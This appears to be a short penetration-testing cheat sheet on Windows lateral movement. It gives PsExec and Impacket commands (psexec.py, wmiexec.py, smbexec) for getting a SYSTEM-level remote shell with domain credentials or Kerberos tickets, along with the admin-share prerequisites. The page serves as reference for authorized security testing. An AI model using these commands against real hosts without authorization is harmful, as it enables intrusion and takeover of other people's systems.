---
title: Impacket (psexec)
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Requirements]
> 1. The user that authenticates to the target machine needs to be part of the Administrators local group.
> 2. The _ADMIN$_ share must be available (enabled by default).
> 3. File and Printer Sharing has to be turned on (enabled by default).
> Points 2 and 3 can be enabled by [[Bypass UAC and Privilege Abuse]]

> [!Important]
> - If we are a domain admin, we will access as NT AUTHORITY\SYSTEM to any host in the domain. 
> - If we are a privileged user on the system, we will access as  NT AUTHORITY\SYSTEM to that specific host.

# PSExec

Windows:
```powershell
PS C:\> .\PsExec64.exe -i \\TARGET_HOSTNAME -u DOMAIN\USER -p PASSWORD cmd # using credentials

PS C:\> .\PsExec.exe \\TARGET_HOSTNAME cmd # using kerberos tickets
```

Linux:
```bash
$ psexec.py DOMAIN_FQDN/ADMIN_USER:'PASSWORD'@TARGET # access the host as SYSTEM user

$ impacket-psexec DOMAIN_FQDN/ADMIN_USER@TARGET # access the host as SYSTEM user

$ wmiexec.py DOMAIN_FQDN/ADMIN_USER:'PASSWORD'@TARGET # access the host as the local admin user we connected with
```

# SMBexec

Linux:
```bash
$ impacket-smbexec ADMIN_USER@TARGET
```